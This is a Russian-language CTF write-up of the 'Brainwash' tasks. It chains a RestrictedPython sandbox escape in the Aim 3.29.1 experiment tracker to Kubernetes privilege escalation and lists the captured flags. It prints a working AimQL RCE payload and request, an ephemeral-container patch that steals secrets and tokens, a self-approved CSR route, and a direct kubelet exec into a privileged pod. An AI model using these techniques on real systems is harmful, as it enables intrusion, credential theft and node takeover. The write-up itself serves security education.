# Brainwash (task13 → task14 → task15) — райтап

**Флаг (task13):** `avito{3Xperim3n7s_aR3_unREL1aBl3_BU7_rcE_N3V3R_liEs}`
**Флаг (task14):** `avito{wHa7_PaS5Es_For_trUth_1S_Eph3mERaL}`
**Флаг (task15):** `avito{Learn_Th3_ORCh3S7r4TioN_Not_The_ind0ctr1n4t1on}`
**Класс:** web (RCE, CVE-2024-2195/CVE-2025-5321) → Kubernetes enum → Kubernetes takeover · **Сложность:** Hard (вся цепочка 13→14→15) · **Очки:** н/д · **Решило команд:** н/д
**Автор:** @abreeva (SPbCTF)

**Суть решения в одном абзаце.** Таргет — ML-трекер экспериментов **Aim 3.29.1**, у которого есть публичная RCE через побег из RestrictedPython-песочницы в языке запросов AimQL (CVE-2024-2195 / CVE-2025-5321). Гаджет срабатывает только при переборе существующих Run'ов, а инстанс стартует с `num_runs=0` — предусловие мы создаём сами, засеяв Run через неаутентифицированный remote-tracking сервер Aim, который проброшен наружу на **нестандартном Kubernetes NodePort `:30800`** (не на дефолтном `:53800`). Дальше — стандартный Kubernetes-pivot из пода: избыточные RBAC-права (`ci-runner` может патчить `ephemeralcontainers`; `cert-manager-sa` может создавать и сам одобрять CSR) в связке с привилегированным подом `log-collector` дают чтение чужих секретов через termination message (task14) и root на ноде через прямой exec в kubelet (task15).

---

## 1. Задача

Три задачи на одном таргете, идущие одна за другой (`https://brainwash-ztkaw810.avitoctf.ru/` → лончер → инстанс Aim на своей k3s-ноде, namespace `brainwash-mlops`):

- **task13** «пошарьтесь хорошенько в их файлах» — прочитать секреты приложения (флаг в `/flag.txt`);
- **task14** «зри в корень» / «загляни в каждый» — из пода эскалировать в Kubernetes-кластер, обойти все поды и достать флаг из чужого секрета;
- **task15** «путь к тотальному доминированию» — захват кластера/ноды целиком, финальный флаг за полный контроль над инфраструктурой.

Все три флага получены на живом инстансе.

## 2. Разведка

### Фингерпринтинг стека

Первый шаг — понять, ЧТО перед тобой, прежде чем что-то фаззить. Признаки сложились в один ответ:

- заголовок ответа `server: uvicorn`;
- путь `/static-files/`;
- характерные React-ассеты (`RunDetailMetricsAndSystemTab.js`, `aim_ui`);
- и главное — полностью читаемый `openapi.json` с эндпоинтами вида `/api/runs/search/run`.

Всё это однозначно указывает на **Aim** (aimhub.io) — open-source ML-трекер экспериментов на FastAPI/uvicorn. Скачали `aim==3.29.1` с PyPI и **сверили его openapi-схему** с той, что отдаёт таргет — схемы совпали побайтово. Значит известна точная версия и весь исходник целиком (`task13/aimsrc/aimpkg/`).

### Карта поверхности

- `:80` (`aim up`) — веб-UI + REST API. Все write-эндпоинты декорированы `@check_read_only` либо требуют уже существующий `run_id`.
- `/api/runs/search/run?q=...` — поиск ранов с AimQL-предикатом (кандидат на RCE).
- `/api/projects/activity/` — отдаёт `num_runs` (индикатор, есть ли раны).
- `/static-files/{path}` — статика UI с корректным traversal-guard'ом (`os.path.commonpath`).
- `/api/reports` — отчёты с клиентским Pyodide (WASM-питон в браузере посетителя).
- remote-tracking сервер Aim (`aim server`) — отдельный процесс, единственный write-канал, по умолчанию слушает `:53800`.

## 3. Как мы вышли на решение (логика гипотез) ← главный раздел

### Наблюдение → гипотеза: known-версия открытого продукта = ищи CVE, а не фаззь

Раз мы точно опознали Aim 3.29.1 и у нас есть исходник, разумная модель — не перебирать параметры вслепую, а искать известные уязвимости именно этой версии. Через `gh api /advisories` подняли полный список Aim CVE. Для пина 3.29.1 актуальны:

- **CVE-2024-2195 / CVE-2025-5321** — RCE-класс: побег из песочницы RestrictedPython в AimQL (язык фильтрации ранов).
- **CVE-2025-51464** — XSS в Reports через Pyodide (клиентская, WASM-питон в браузере посетителя).
- **CVE-2025-51463** — path traversal → arbitrary file write в `restore_run_backup()`, достижим только через remote-tracking RPC.

RCE-класс (2024-2195/2025-5321) — самый ценный, дальше копали его.

### Проверка по исходнику → тупик №1: «RCE есть, а сработать нечем»

Построчная перепроверка исходника (`aim/storage/query.py`, `aim/web/api/runs/views.py`) показала неприятное: вредоносный AimQL-предикат вычисляется (`eval`) **только** во время итерации по существующим объектам Run — внутри `for run in runs_iterator` в `QueryRunSequenceCollection`. На свежем инстансе `num_runs=0` (проверено многократными Stop/Start рестартами через лончер, с мониторингом далеко за пределами заявленных ~180 сек «boot+seed»). Все write-эндпоинты на `:80` либо декорированы `@check_read_only`, либо требуют уже существующий `run_id` — **ни один эндпоинт на `:80` не создаёт Run**. Классическая курица-яйцо: эксплойт готов, а срабатывать не на чем.

### Тупик №2: Reports/Pyodide XSS — есть, но бесполезна

Проверили Reports/Pyodide (реальным headless Chrome через Playwright) как альтернативный путь что-то создать. XSS (CVE-2025-51464) подтверждена живьём (`pyodide.code.run_js` реально делает fetch и `alert()`), но объект `repo`, доступный внутри отчёта, экспортирует только `fetch_*`-методы — это **read-only** обёртка над тем же `/api/runs/search/*`. Создать Run из отчёта невозможно; второго пользователя/бота, которого можно было бы атаковать XSS'ом, тут нет. Отпало.

### Тупик №3 (самый поучительный): «порт `:53800` мёртв» — на самом деле артефакт своей же точки измерения

По коду единственный путь создать Run — remote-tracking сервер Aim (`aim server`), принимающий запись без авторизации. По умолчанию он слушает `:53800`. Прямые попытки достучаться до этого порта извне (curl, python `requests`, реальный `aim`-SDK, даже нативный браузерный WebSocket) стабильно давали «тишину» — и первым выводом было «порт не проброшен наружу».

Этот вывод оказался **ошибочным по причине, а не по факту**, и ошибка поучительна сама по себе: все эти «независимые» проверки шли из одной и той же песочницы с egress только на 80/443. То есть три «независимых» инструмента упирались в один и тот же артефакт собственной сетевой позиции, а не в свойство таргета. Мораль: **три инструмента, идущие через одну и ту же точку выхода, — это не тройное подтверждение, а один и тот же артефакт, повторённый трижды.**

Контрольный тест с чистой пользовательской сети (`egress_check.py`, без VPN) показал: заведомо живые публичные сервисы на нестандартных портах отвечают нормально — сеть чистая. Но и с неё `:53800` (порт по умолчанию) вёл себя как «пустой»: TCP-коннект проходит, ответа нет ни на каком протоколе, ровно как у заведомо пустых портов того же хоста. Значит это не блокировка провайдера и не артефакт песочницы, а сам Kubernetes Service/LB перед подом реально **не пробрасывает наружу дефолтный `:53800`** — но это ещё не значит, что write-канал недостижим вообще.

### Решающий шаг: смотреть весь NodePort-диапазон, а не «стандартный» порт из документации

Раз default-порт закрыт, надо смотреть на реальную топологию Kubernetes-сервиса, а не только на «стандартный» порт из документации Aim. Полный скан диапазона NodePort (30000–32767) нашёл, что tracking-сервер **реально выставлен наружу на NodePort `:30800`** (ответ `{"status": "OK"}` на `/status/`) — отдельный нестандартный порт, до которого предыдущие проверки просто не доходили, потому что перебирались только «угаданные» кандидаты (53800/8000/8080/43800), а не весь диапазон. Этот один факт — «смотри на весь NodePort-диапазон, а не только на документированный дефолт» — и разблокировал всю цепочку.

### Дальше (task14/15): наблюдение → гипотеза о Kubernetes-privesc

Как только есть RCE в поде, дальше работает стандартная модель угроз Kubernetes: у пода есть смонтированный service-account токен → можно ходить в API кластера → искать избыточные RBAC-права. Гипотеза «где-то права шире, чем нужно» подтвердилась дважды: `ci-runner` умеет `ephemeralcontainers patch` (task14), а украденный `cert-manager-sa` умеет создавать и **сам одобрять** CSR (task15). Детали проверки — в §5.

## 4. Уязвимость

Тут не одна уязвимость, а связка «архитектурная дыра в изоляции» + «побег из песочницы», которые вместе дают путь до RCE, плюс — на следующих этапах — типичная схема Kubernetes privesc через избыточные RBAC-права.

### 1. Побег из RestrictedPython (CVE-2024-2195 / CVE-2025-5321)

AimQL позволяет фильтровать Run-объекты Python-подобным выражением (`run.archived == False`), которое исполняется через `RestrictedPython`. «Песочница» блокирует только имена, начинающиеся с `_`. Но от любого разрешённого объекта обычной цепочкой **публичных** атрибутов можно дойти до системных модулей — **attribute pivot**:

```
run.db.runs().session.bind.dialect.dbapi.datetime.sys.modules["os"].system("<команда>")
```

Пошагово: `run.db` — SQLAlchemy-сессия → `.dialect.dbapi` — модуль `sqlite3` → `.datetime` — модуль `datetime`, импортированный внутрь `sqlite3` → `.sys` → `.modules["os"]` → `.system()`. Ни одно звено не начинается с `_`, поэтому блэклист по подчёркиванию бесполезен.

### 2. Внешне доступный unauth write-канал (self-seed через NodePort)

Гаджет срабатывает только при переборе существующих Run, а единственный способ создать Run — Aim remote-tracking сервер без авторизации, случайно (или по недосмотру инфраструктуры) выставленный наружу на нестандартном NodePort `:30800`. Это и есть предусловие для срабатывания п.1: атакующий сначала создаёт себе Run через `aim://<host>:30800`, а уже потом бьёт по AimQL.

### 3. Избыточность Kubernetes RBAC (task14/15)

На этапах task14/15 уязвимость — не в одном месте, а в наборе слишком широких прав у сервис-аккаунтов (`ci-runner` может патчить `ephemeralcontainers` любого пода неймспейса; `cert-manager-sa` может создавать и **сам одобрять** CSR) в сочетании с тем, что кастомный admission-webhook ограничивает **subject** CSR, но не запрещает получить рабочий (пусть и не `system:masters`) клиентский сертификат — которого хватает, чтобы дотянуться до kubelet и там получить root на ноде через привилегированный под.

## 5. Эксплойт по шагам

### task13 — RCE и первый флаг

1. **Self-seed Run** через найденный write-канал на NodePort `:30800`:
   ```python
   from aim import Run
   run = Run(repo="aim://<host>:30800", experiment="medoed")
   run["pwn"] = "medoed-was-here"
   run.close()
   ```
   После этого `GET /api/projects/activity/` показывает `num_runs=1` — предикат AimQL теперь будет исполняться.

2. **Стреляем AimQL RCE** — гаджет из §4, обёрнутый в командную строку:
   ```
   GET /api/runs/search/run?q=run.db.runs().session.bind.dialect.dbapi.datetime.sys.modules["os"].system("<b64-decoded shell>") or 1&limit=1
   ```
   `limit=1` — важная деталь: без него Aim пытается пройтись по всем Run'ам (при большом числе накопленных ранов держит единственный uvicorn-воркер занятым надолго); с `limit=1` предикат гарантированно исполняется на первом же Run — стоимость O(1).

3. **Эксфильтрация.** Корневая ФС пода read-only, а `/static-files/{path}` защищён корректно (`os.path.commonpath`, честный traversal-guard). Рабочих схем две:
   - когда `aim_ui/build` доступен на запись — RCE копирует нужный файл туда, читаем обычным GET `/static-files/<random>.bin` (`exploit.py`, режим `exfil`);
   - когда ФС read-only и в `aim_ui/build` писать нельзя — кладём вывод команды в **параметр Run** через локальный SDK (`Run(repo='/data/repo'); r['out']=...`) и читаем обратно через `GET /api/runs/{id}/info` (`rce_exec.py`).

4. Результат: `/flag.txt` (смонтированный k8s-секрет `flag1`) в поде `webapp`, namespace `brainwash-mlops`, k3s, сервис-аккаунт **`ci-runner`** — **flag1**. Тем же выстрелом достаём токен `ci-runner` (`/var/run/secrets/kubernetes.io/serviceaccount/token`).

### task14 — «зри в корень», обход Kubernetes (pivot из task13)

Из RCE у нас есть shell в поде — а значит и стандартный путь Kubernetes из пода в кластер:

1. Читаем токен `ci-runner`, `namespace`, `ca.crt` из `/var/run/secrets/kubernetes.io/serviceaccount/` (уже читали в task13).
2. Обращаемся к API кластера этим токеном на `https://kubernetes.default.svc` (ClusterIP, доступен только изнутри пода — запросы идут через ту же RCE, не с внешней машины).
3. Смотрим RBAC `ci-runner` (`pod_rbac.py`): выдано `pods get/list` и, важнее, **`pods/ephemeralcontainers patch`** — право подсаживать отладочный контейнер в ЛЮБОЙ под неймспейса, но НЕ `exec`/`logs` и НЕ прямое чтение `secrets`.
4. Перечисляем все поды (`pod_all.py`), ищем, где ещё смонтирован секрет с флагом. Находим под **`cert-agent`** (SA `cert-manager-sa`) с secret-volume, имя которого содержит `flag`, смонтированным в `/flag.txt` — но напрямую секрет читать нельзя (403).
5. Раз `exec`/`logs` нет, а `ephemeralcontainers patch` есть — используем именно это единственное разрешённое действие: **PATCH** в под `cert-agent` эфемерный контейнер, который монтирует тот же volume read-only и одной командой дампит его в **termination message** (`/dev/termination-log`), а не в stdout — потому что termination message читается через обычный `pods/get` (уже разрешённый verb), в отличие от `logs`/`exec`.
   ```python
   patch = {"spec": {"ephemeralContainers": [{
       "name": EC,
       "image": "registry.internal.brainwash/base:v1",
       "command": ["sh", "-c", "cat /f/* > /dev/termination-log 2>&1; sleep 2"],
       "volumeMounts": [{"name": VOL, "mountPath": "/f", "readOnly": True}],
       "terminationMessagePolicy": "File",
       "terminationMessagePath": "/dev/termination-log",
       "securityContext": {  # PodSecurity "restricted"-совместимо — иначе admission отклонит патч
           "allowPrivilegeEscalation": False, "capabilities": {"drop": ["ALL"]},
           "runAsNonRoot": True, "runAsUser": 10001, "seccompProfile": {"type": "RuntimeDefault"},
       },
   }]}}
   ```
   Контейнер завершается, читаем `status.ephemeralContainerStatuses[].state.terminated.message` через `GET /api/v1/namespaces/{ns}/pods/{pod}` — это и есть содержимое секрета.
6. Результат — **flag2** (секрет `flag2`, смонтированный `/flag.txt` в поде `cert-agent`).

### task15 — тотальное доминирование (pivot из task14)

Тот же приём с ephemeral-контейнером, но теперь монтируем не data-volume, а **собственный projected service-account volume** пода `cert-agent`, чтобы украсть токен `cert-manager-sa` (`pod_sa.py`):
```python
patch["spec"]["ephemeralContainers"][0]["command"] = ["sh", "-c", "cat /sa/token > /dev/termination-log 2>&1; sleep 2"]
# volumeMounts -> projected-том с serviceAccountToken источником
```

1. **Токен `cert-manager-sa` получен.** Его RBAC: разрешено **создавать и одобрять CertificateSigningRequest** с `signerName: kubernetes.io/kube-apiserver-client` — то есть можно самому выпустить себе клиентский сертификат для аутентификации в API-сервере.
2. **Первая попытка — напрямую в `system:masters`.** Формируем CSR с `O=system:masters` (`build_csr.py`/`pod_csr.py`) — классический путь к cluster-admin. Но на кластере стоит кастомный admission-webhook (`csr-subject.brainwash.local`), который **принудительно переписывает subject** одобряемого CSR на `CN=proxyman, O=node-proxymen` — `system:masters` заблокирован конкретно на уровне webhook'а, не RBAC. (Это тупик №4: очевидный путь к админству закрыт, но не полностью.)
3. **Работаем с тем, что дают.** Создаём CSR → сами же (правами `cert-manager-sa`) его одобряем → забираем подписанный сертификат `CN=proxyman, O=node-proxymen` (`pod_mint.py`, EC-ключ, чтобы CSR-payload был меньше). RBAC этой новой identity — только `nodes/proxy get` (доступ к kubelet), никакого админства — но этого достаточно для следующего шага.
4. **Идём к kubelet.** С сертификатом `proxyman` обращаемся к API-серверу по пути `/api/v1/nodes/{node}/proxy/pods` (`pod_kubelet.py`) — видим список всех подов ноды, в том числе **`kube-system/log-collector`**: `privileged: true`, `runAsUser: 0`, с `hostPath: /` смонтированным в `/host` (`pod_priv.py` подтвердил разбором `securityContext`/`volumes` каждого пода на ноде).
5. **exec в привилегированный под = root на ноде.** Ключевая деталь: exec через `nodes/proxy`-путь на API-сервере **обрезает query string** WebSocket-запроса (параметры команды теряются) — поэтому WebSocket-exec бьём не через apiserver-proxy, а **напрямую в kubelet на `<hostIP>:10250`**, используя тот же клиентский сертификат `proxyman` (он всё равно авторизован как `nodes/proxy get`, а kubelet проверяет тот же клиентский TLS-сертификат) (`pod_exec.py`):
   ```
   GET /exec/kube-system/log-collector-.../collector?command=sh&command=-c&command=<cmd>&output=1&error=1&tty=0
   Upgrade: websocket
   Sec-WebSocket-Protocol: v4.channel.k8s.io
   ```
6. Внутри `log-collector` (root, hostPath `/` в `/host`): `cat /host/flag.txt` → **flag3**. Заодно прочитали `/host/etc/rancher/k3s/k3s.yaml` — kubeconfig с `system:masters` (буквальное тотальное доминирование над кластером, не только флаг).

## 6. Флаг

```
task13: avito{3Xperim3n7s_aR3_unREL1aBl3_BU7_rcE_N3V3R_liEs}
task14: avito{wHa7_PaS5Es_For_trUth_1S_Eph3mERaL}
task15: avito{Learn_Th3_ORCh3S7r4TioN_Not_The_ind0ctr1n4t1on}
```

## 7. Выводы

1. **Фингерпринтинг → известная CVE экономит часы.** Опознали Aim 3.29.1 по `openapi.json` (сверка с PyPI-wheel даёт точный исходник бесплатно) → сразу пошли смотреть CVE именно этой версии, а не фаззить вслепую.
2. **Чёрные списки в песочницах почти всегда обходятся.** RestrictedPython блокирует по `_`, но attribute-pivot доводит до `os` цепочкой публичных атрибутов — от любого доступного объекта. Безопасно — только строгий белый список, а лучше вообще не исполнять пользовательские выражения в процессе приложения.
3. **Проверяй свою собственную точку измерения, а не только цель.** Вывод «порт 53800 мёртв» изначально был артефактом ограниченного egress песочницы (только 80/443) — «три независимых инструмента» на деле шли через одну точку выхода. Контрольный тест на заведомо живых сервисах вскрыл это.
4. **Не ограничивайся портом «по умолчанию».** Настоящий write-канал был не на дефолтном `:53800`, а на нестандартном Kubernetes NodePort `:30800` — нашёлся только полным сканом диапазона (30000–32767), а не перебором «угаданных» портов.
5. **В Kubernetes даже без `exec`/`logs`/`get secrets` можно прочитать секрет**, если разрешён `ephemeralcontainers patch`: подсадить контейнер, который сам сдампит нужный volume в **termination message**, читаемое через обычный `pods/get`.
6. **CSR + право самоодобрения — путь к эскалации, но admission-webhook может сузить, а не закрыть его.** Даже когда `system:masters` заблокирован на уровне webhook'а (подмена subject), полученный «слабый» сертификат (`nodes/proxy`) может быть достаточным трамплином до kubelet → root на ноде → чтение любых файлов, включая kubeconfig с реальным cluster-admin.
7. **Иногда прокси на уровне API-сервера ломает протокол** (обрезает query string у WebSocket-запроса) — если что-то не работает через штатный proxy-путь, стоит проверить прямое обращение к backend-сервису (здесь — kubelet на `:10250`) той же авторизацией.
8. **Дисциплина сидирования:** засеивай ровно ОДИН Run; накопление сотен ранов OOM-крашит `aim up`.

## 8. Артефакты

- `task13/rce_exec.py` — переиспользуемый RCE→exfil шелл через параметр Run (для read-only ФС); **curated-скрипт task13** (ruff+ty чисто, Google-docstring), только stdlib.
- `task13/pod_all.py` — enum подов + ephemeral-container дамп секрета в termination message (**flag2**); **curated-скрипт task14** (ruff+ty чисто, Google-docstring), только stdlib.
- `task13/pod_exec.py` — прямой WebSocket-exec в kubelet `:10250` (root на ноде, **flag3**); **curated-скрипт task15** (ruff+ty чисто, Google-docstring), только stdlib.
- `task13/exploit.py` — RCE PoC (режимы `marker`/`exfil`/`runs`).
- `task13/pwn_brainwash.py` — self-seed через remote-tracking + RCE одним скриптом.
- `task13/pod_sa.py` — кража токена `cert-manager-sa` тем же ephemeral-приёмом.
- `task13/build_csr.py` / `task13/pod_csr.py` / `task13/pod_mint.py` — генерация и подача CSR, self-approve, получение сертификата `proxyman`.
- `task13/pod_kubelet.py` / `pod_kubelet2.py` / `pod_priv.py` — энумерация подов ноды через `nodes/proxy`, поиск привилегированного `log-collector`.
- `task13/pod_rbac.py` — проверка RBAC (`clusterrolebindings`/`roles`) для `ci-runner` и `cert-manager-sa`.
- `task13/scan_instance.py`, `task13/probe53800.py`, `task13/egress_check.py` — сетевая диагностика (различение реального бэкенда от LB-шума, контроль собственной точки измерения).
- `task13/aimsrc/aimpkg/` — исходник Aim 3.29.1 с точными строками уязвимого гаджета (вендор, не трогаем).
- `task13/flags_found.txt`, `task13/chal_root.txt` — сводка по всем трём флагам.

Сжатая командная шпаргалка той же цепочки (на английском) — `task13/SOLVED_writeup.md`.
